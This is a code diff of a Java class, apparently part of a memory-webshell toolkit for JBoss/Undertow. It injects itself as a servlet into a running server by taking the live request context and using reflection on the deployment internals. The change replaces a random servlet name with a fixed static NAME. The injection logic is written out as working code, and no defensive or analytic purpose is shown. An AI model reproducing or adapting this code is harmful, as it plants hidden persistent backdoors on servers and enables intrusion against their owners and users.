@@ -28,10 +28,10 @@ public class JBSMSFromContextS implements Servlet {
 
     public static String pattern;
 
+    public static String NAME;
+
     static {
         try {
-            String servletName = String.valueOf(System.nanoTime());
-
             HttpServletRequestImpl request = (HttpServletRequestImpl) PolicyContext.getContext("javax.servlet.http.HttpServletRequest");
             ServletContext         context = request.getServletContext();
             Field                  f       = context.getClass().getDeclaredField("deploymentInfo");
@@ -40,10 +40,10 @@ public class JBSMSFromContextS implements Servlet {
 
             //只添加一次
             Map<String, ServletInfo> servlets = deploymentInfo.getServlets();
-            if (!servlets.containsKey(servletName)) {
+            if (!servlets.containsKey(NAME)) {
 
                 Class       clazz       = JBSMSFromContextS.class;
-                ServletInfo servletInfo = new ServletInfo(servletName, clazz, new ConstructorInstanceFactory<Servlet>(clazz.getDeclaredConstructor()));
+                ServletInfo servletInfo = new ServletInfo(NAME, clazz, new ConstructorInstanceFactory<Servlet>(clazz.getDeclaredConstructor()));
                 deploymentInfo.addServlet(servletInfo);
 
                 f = context.getClass().getDeclaredField("deployment");
